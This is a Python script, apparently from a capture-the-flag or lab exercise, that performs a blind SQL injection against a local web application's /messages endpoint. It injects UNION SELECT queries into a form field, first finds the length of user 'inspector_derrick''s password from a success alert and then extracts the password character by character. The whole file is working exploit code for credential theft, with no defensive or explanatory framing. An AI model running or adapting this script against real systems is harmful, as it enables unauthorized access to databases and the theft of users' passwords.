import requests
import string
from bs4 import BeautifulSoup
import sys

addr = "0.0.0.0" if len(sys.argv) > 1 else "127.0.0.1"

# Find the length of the password
i = 1
while True:
	query = "'UNION SELECT name, password FROM users WHERE name LIKE 'inspector_derrick' "
	query = query + "AND LENGTH(password) = '" + str(i)

	data = {"name": query}

	post = requests.post("http://" + addr + "/messages", data=data)

	soup = BeautifulSoup(post.content, 'html.parser')
	result = soup.find("div", {"class": "alert alert-success"})

	if result != None:
		break;
	i += 1

all_chars = string.ascii_letters + string.digits


password = ""

# For each character in the password, try each possible character until we find the correct one
for x in range(i):
	for character in all_chars:
		query = "'UNION SELECT name, password FROM users WHERE name LIKE 'inspector_derrick' "
		query = query + "AND SUBSTRING(password, " + str(x+1) + ", 1) = '" + character

		data = {"name": query}
		post = requests.post("http://" + addr + "/messages", data=data)

		soup = BeautifulSoup(post.content, 'html.parser')
		result = soup.find("div", {"class": "alert alert-success"})

		if result != None:
			password += character
			print(password)
			break

print(password)